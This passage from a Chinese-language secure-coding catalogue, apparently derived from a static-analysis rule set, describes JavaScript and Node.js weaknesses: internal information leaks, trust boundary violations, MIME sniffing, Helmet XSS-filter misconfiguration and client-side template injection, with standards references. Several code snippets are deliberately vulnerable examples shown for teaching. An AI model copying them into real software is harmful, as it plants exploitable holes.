<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[33] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[34] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="System-Information-Leak-Internal"><a href="#System-Information-Leak-Internal" class="headerlink" title="System Information Leak: Internal"></a>System Information Leak: Internal</h4><h5 id="ABSTRACT-13"><a href="#ABSTRACT-13" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>显示系统数据或调试信息使攻击者能够使用系统信息来计划攻击。</p>
<h5 id="EXPLANATION-13"><a href="#EXPLANATION-13" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>通过打印或日志记录功能将系统数据或调试信息发送到本地文件、控制台或屏幕时，就会发生内部信息泄露。</p>
<p>示例 1：以下代码会将一个异常写入标准错误流：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">http.request(options, function(res)&#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;).on(&apos;error&apos;, function(e)&#123;</span><br><span class="line"></span><br><span class="line">  console.log(&apos;There was a problem with the request: &apos; + e);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>根据这一系统配置，该信息可能会转储到控制台、写入日志文件或公开给用户。在某些情况下，该错误消息会告诉攻击者该系统易遭受的确切攻击类型。例如，数据库错误消息可以揭示应用程序容易受到 SQL Injection 攻击。其他错误消息可以揭示有关该系统的更多间接线索。在Example 1中，泄露的信息可能会暗示有关操作系统类型、系统上安装了哪些应用程序以及管理员在配置程序时采取了哪些保护措施的信息。</p>
<h5 id="RECOMMENDATIONS-13"><a href="#RECOMMENDATIONS-13" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>编写错误消息时，始终要牢记安全性。在编码的过程中，尽量避免使用繁复的消息，提倡使用简短的错误消息。限制生成与存储繁复的输出数据可帮助管理员和程序员诊断问题。调试踪迹有时可能出现在不明显的位置（例如，嵌入在错误页 HTML 的注释中）。</p>
<p>即便是并未揭示栈踪迹或数据库转储的简短错误消息，也有可能帮助攻击者发起攻击。例如，“Access Denied”（拒绝访问）消息可以揭示系统中存在一个文件或用户。</p>
<h5 id="REFERENCES-13"><a href="#REFERENCES-13" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 497 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001312, CCI-002420 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 8.3.2 Sensitive Private Data, 8.3.4 Sensitive Private Data, 8.3.4 Sensitive Private Data, 14.3.3 Unintended Security Disclosure Requirements </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6 </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.5 </p>
<p>[15] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.6 - Sensitive Data Retention </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II </p>
<p>[33] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[34] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Trust-Boundary-Violation"><a href="#Trust-Boundary-Violation" class="headerlink" title="Trust Boundary Violation"></a>Trust Boundary Violation</h4><h5 id="ABSTRACT-14"><a href="#ABSTRACT-14" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在同一数据结构中将可信赖数据和不可信赖数据混合在一起会导致程序员错误地信赖未验证的数据。</p>
<h5 id="EXPLANATION-14"><a href="#EXPLANATION-14" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>信任边界可以理解为在程序中划分的分界线。分界线的一边是不可信赖的数据。分界线的另一边则是被认定为是可信赖的数据。验证逻辑的用途是允许数据安全地跨越信任边界 — 从不可信赖的一边移动到可信赖的另一边。</p>
<p>当程序使可信赖和不可信赖的分界线模糊不清时，就会发生 Trust Boundary Violation 漏洞。发生这种错误的最普遍方式是允许可信赖的数据和不可信赖的数据共同混合在同一数据结构中。</p>
<p>示例：以下代码将一个不可信的项目 (URL) 从 iOS 扩展 JavaScript 脚本传递到 iOS 扩展代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var GetURL = function() &#123;&#125;;</span><br><span class="line"></span><br><span class="line">GetURL.prototype = &#123;</span><br><span class="line"></span><br><span class="line">    run: function(arguments) &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        arguments.completionFunction(&#123; &quot;URL&quot;: document.location.href &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...        </span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var ExtensionPreprocessingJS = new GetURL;</span><br></pre></td></tr></table></figure>
<p>若不对信任边界进行合理构建及良好维护，则程序员不可避免地会混淆哪些数据已经过验证，哪些尚未经过验证。这种混淆最终会导致某些数据未经验证就加以使用了。</p>
<h5 id="RECOMMENDATIONS-14"><a href="#RECOMMENDATIONS-14" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在应用程序中定义信任边界。不要在数据结构中储存在某些环境下受信任而在其他环境下又转而不可信赖的数据。应尽量减少数据跨越信任边界的方式。</p>
<p>在处理输入之前，需要通过一系列用户交互来累积输入时，有时就会出现 Trust Boundary Violation 漏洞。所以，在得出所有数据之前，不可能进行完整的输入验证。在这种情况下，维护信任边界仍然是非常重要的。应将不可信赖的数据添加到一个不受信任数据结构中，待验证后，再移至可信赖的区域。</p>
<h5 id="REFERENCES-14"><a href="#REFERENCES-14" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] M. Howard, D. LeBlanc Writing Secure Code, Second Edition Microsoft Press</p>
<p>[2] FUNDAMENTALS-4: Establish trust boundaries Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 501 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001084, CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 SI </p>
<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002360 CAT II, APSC-DV-002560 CAT I </p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><h4 id="HTML5-MIME-Sniffing"><a href="#HTML5-MIME-Sniffing" class="headerlink" title="HTML5: MIME Sniffing"></a>HTML5: MIME Sniffing</h4><h5 id="ABSTRACT-15"><a href="#ABSTRACT-15" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Node.js 应用程序不会将 X-Content-Type-Options 设置为 nosniff，也不会明确禁用此安全标头。</p>
<h5 id="EXPLANATION-15"><a href="#EXPLANATION-15" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>MIME 探查是检查字节流内容以尝试推断其中数据格式的一种做法。</p>
<p>如果没有明确禁用 MIME 探查，则有些浏览器会被操控以非预期方式解析数据，从而导致跨站点脚本攻击风险。</p>
<p>对于可能包含用户可控制内容的每个页面，您应该使用 HTTP 标头 X-Content-Type-Options: nosniff。</p>
<h5 id="RECOMMENDATIONS-15"><a href="#RECOMMENDATIONS-15" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了确保应用程序不易遭受 MIME 探查攻击，程序员可以：</p>
<ol>
<li><p>为所有页面全局设置 HTTP 标头 X-Content-Type-Options: nosniff，例如，使用 Express 与 Helmet 中间件。</p>
</li>
<li><p>仅对可能包含用户可控制内容的那些页面设置需要的标头。</p>
</li>
</ol>
<p>为了全局设置 HTTP 标头，在与 Express 应用程序一起使用时，Helmet 中间件将默认进行此设置。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&apos;express&apos;);</span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">var helmet = require(&apos;helmet&apos;);</span><br><span class="line"></span><br><span class="line">app.use(helmet());</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>或者，可以使用Express应用程序中不同路由器的不同设置，以类似方式在单独的页面上进行此设置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&apos;express&apos;);</span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">var helmet = require(&apos;helmet&apos;);</span><br><span class="line"></span><br><span class="line">var myRouter = express.Router();</span><br><span class="line"></span><br><span class="line">myRouter.use(helmet.noSniff());</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>此标头对于防止某些攻击类至关重要，不应删除此标头或将其设置为任何其他值。</p>
<h5 id="REFERENCES-15"><a href="#REFERENCES-15" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Node.js Security Checklist </p>
<p>[2] OWASP OWASP List of useful HTTP headers </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 554 </p>
<p>[4] Standards Mapping - Common Weakness Enumeration Top 25 2019 [3] CWE ID 020 </p>
<p>[5] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[6] Standards Mapping - FIPS200 CM </p>
<p>[7] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[9] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.1.3 Input Validation Requirements, 5.1.4 Input Validation Requirements, 14.1.3 Build </p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[22] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15) </p>
<h4 id="Helmet-Misconfiguration-Insecure-XSS-Filter"><a href="#Helmet-Misconfiguration-Insecure-XSS-Filter" class="headerlink" title="Helmet Misconfiguration: Insecure XSS Filter"></a>Helmet Misconfiguration: Insecure XSS Filter</h4><h5 id="ABSTRACT-16"><a href="#ABSTRACT-16" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>将所有 Internet Explorer 版本的 X-XSS-Protection 设置为 1; mode=block 会造成在旧版浏览器中产生跨站点脚本缺陷。</p>
<h5 id="EXPLANATION-16"><a href="#EXPLANATION-16" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>X-XSS-Protection 是 Microsoft 推出的 HTTP 标头，自推出以来，已被许多其他浏览器采用。该标头旨在帮助阻止 Cross-Site Scripting 攻击成功，但会无意中导致产生缺陷，使得安全的网站易受攻击[1]。由于这个原因，不应将该标头用于旧版 Internet Explorer，应将其设置为 0 以禁用。</p>
<p>示例 1：以下示例在 Express 应用程序中错误地配置 Helmet 中间件，从而为所有 Internet Explorer 版本启用此标头： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&apos;express&apos;);</span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">var helmet = require(&apos;helmet&apos;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">app.use(helmet.xssFilter(&#123; setOnOldIE: true&#125;));</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-16"><a href="#RECOMMENDATIONS-16" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>对于最近版本的浏览器，应将 X-XSS-Protection 设置为 1; mode=block，但对于旧版 Internet Explorer（8 及以下），由于它们容易受到攻击，应将此标头设置为 0。</p>
<p>使用 Helmet 中间件时，默认设置是安全的，因此应使用默认设置。绝对不应对所有 Internet Explorer 版本明确启用这种保护。</p>
<p>示例 2：以下内容会修复Example 1 中显示的错误配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&apos;express&apos;);</span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">var helmet = require(&apos;helmet&apos;);</span><br><span class="line"></span><br><span class="line">app.use(helmet());</span><br><span class="line"></span><br><span class="line">//or</span><br><span class="line"></span><br><span class="line">app.use(helmet.xssFilter());</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-16"><a href="#REFERENCES-16" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Eduardo Vela Nava, David Lindsay Abusing Internet Explorer 8’s XSS Filters </p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 554 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration Top 25 2019 [3] CWE ID 020 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 CM </p>
<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.1.3 Input Validation Requirements, 5.1.4 Input Validation Requirements, 14.1.3 Build </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h3 id="输入验证与展示问题"><a href="#输入验证与展示问题" class="headerlink" title="输入验证与展示问题"></a>输入验证与展示问题</h3><h4 id="Client-Side-Template-Injection"><a href="#Client-Side-Template-Injection" class="headerlink" title="Client-Side Template Injection"></a>Client-Side Template Injection</h4><h5 id="ABSTRACT-17"><a href="#ABSTRACT-17" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>用户控制的数据用作模板引擎的模板，使得攻击者能够访问模板上下文，并在某些情况下在浏览器中注入和运行恶意代码。</p>
<h5 id="EXPLANATION-17"><a href="#EXPLANATION-17" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并通过模板设置格式，以生成 Web 页面、电子邮件等。模板引擎可通过条件、循环等代码构造处理上下文数据，从而允许在模板中使用功能强大的语言表达式来呈现动态内容。如果攻击者能够控制要呈现的模板，他们将能够通过注入表达式来公开上下文数据并在浏览器中运行恶意代码。</p>
<p>示例 1：以下示例显示了如何通过 URL 检索模板并使用模板在 AngularJS 中呈现信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function MyController(function($stateParams, $interpolate)&#123;</span><br><span class="line"></span><br><span class="line">    var ctx = &#123; foo : &apos;bar&apos; &#125;;</span><br><span class="line"></span><br><span class="line">    var interpolated = $interpolate($stateParams.expression);</span><br><span class="line"></span><br><span class="line">    this.rendered = interpolated(ctx);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
